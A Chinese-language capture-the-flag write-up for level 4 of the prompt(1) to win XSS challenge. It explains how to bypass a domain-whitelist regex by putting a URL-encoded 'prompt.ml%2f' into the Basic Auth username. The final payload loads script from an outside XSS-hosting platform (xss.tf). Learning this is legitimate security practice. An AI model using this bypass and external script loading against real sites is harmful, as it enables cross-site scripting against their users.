## [[prompt(1) to win](http://prompt.ml)] [[Level 4 - Basic Auth](http://prompt.ml/4)] [[解题报告](http://exp-blog.com/2019/03/18/pid-3635/)]

------

## 题目

```javascript
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}
```

------------

## 解题报告

### 题目分析

这题要要先满足正则条件，才会把我们的输入放到 `<script>` 标签中执行。

换言之若注入成功，得到的 javascript 代码是这样的 `<script src=input />`

问题是若要成功注入，则 input 必须含有这三个固定前缀中的一个：

- `//prompt.ml/`
- `https://prompt.ml/`
- `http://prompt.ml/`

看起来好像无从下手，但实际上这里可以利用 HTTP 的 Basic Auth 认证语法去绕过。


------------

### Basic Auth 语法

当一个网站需要使用 Basic Auth 认证登陆时，若直接访问这个网址，会弹出类似下面这样的要求输入账密的对话框：

![](http://exp-blog.com/wp-content/uploads/2019/03/dbdf1dad58fe5a92d3da8905e932693c.png)

Basic Auth 认证方式也允许在访问网站 `http://host `时，直接在 URL 中加上账密，格式为：

`http://username:password@host`

这种用法其实现在也很普遍的，例如 git clone url 就可以这样用。

> 若一个网址不需要 Basic Auth 认证，同样也可以使用这种方式访问，只是输入的账密会被无视而已。

------------

### 绕过正则

回到这题，我们可以把这个固定前缀 `prompt.ml/` 构造成 Basic Auth 的 `username` 部分。

但是 `username` 不允许出现 `/` 符号，可以对其进行 URL 编码，即 `%2f` 。

注意到题目的代码中会对 `input` 做 `decodeURIComponent(input)` 处理后再进行正则校验，因此即使 `/` 符号被 URL 编码也可以通过正则校验。


------------

### 利用 XSS 平台

至此，我们可以先把 input 构造成这样：`http://prompt.ml%2f:pwd@` （密码部分随便即可）

我们看到此时题目的输出为：`<script src="http://prompt.ml%2f:pwd@"></script>`

由于我们构造的 Basic Auth 是无效的，所以这个输出等价于：`<script src="http://"></script>`

![](http://exp-blog.com/wp-content/uploads/2019/03/b2ad39d513cf2b71144df5b245b1826e.png)

这里我们可以利用 XSS 平台构造一个站点执行 `prompt(1)` ，然后把这个站点地址放到 `<script>` 标签即可。


XSS 平台推荐使用 [http://xss.tf](http://xss.tf) ，新建一个项目，自定义代码为 `prompt(1)` ，得到项目地址： `http://xss.tf/RVO` （注意每个人的项目地址都是不同的）。

![](http://exp-blog.com/wp-content/uploads/2019/03/88017554908cc309e40ec3eb09a1a4d7.png)

利用 XXS 平台的项目地址，构造最终的 payload 为：`http://prompt.ml%2f:pwd@xss.tf/RVO`

![](http://exp-blog.com/wp-content/uploads/2019/03/2436571a3d26f9da280710c5d62b0105.png)


------------

### 一个 BUG

没错，这题是有 BUG 的，前面构造的这个 payload ，在 Chrome 、Edge、360 浏览器都是无法完成挑战的。

打开浏览器开发者工具的 Console ，发现 XSS 请求被 block 掉了。因为 XSS 请求发不出去，导致无法完成挑战。

最终**只有 Firefox 浏览器可以通过**。

![](http://exp-blog.com/wp-content/uploads/2019/03/6cf762727af6af48e5c7348c935658a4.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
